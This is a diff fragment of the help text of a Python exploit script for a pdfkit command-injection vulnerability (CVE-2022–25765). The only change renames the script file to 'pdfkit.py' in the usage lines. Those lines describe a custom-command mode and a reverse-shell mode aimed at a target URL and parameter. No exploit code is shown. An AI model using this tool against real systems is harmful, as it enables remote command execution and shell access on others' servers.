@@ -37,11 +37,11 @@ def help():
     print(r"""UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection
 
 Usage:
-  python3 exploit-CVE-2022–25765.py -c <command>
-  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
-  python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
-  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
-  python3 exploit-CVE-2022–25765.py -h
+  python3 pdfkit.py -c <command>
+  python3 pdfkit.py -s <local-IP> <local-port>
+  python3 pdfkit.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
+  python3 pdfkit.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
+  python3 pdfkit.py -h
 
 Options:
   -c    Custom command mode. Provide command to generate custom payload with.
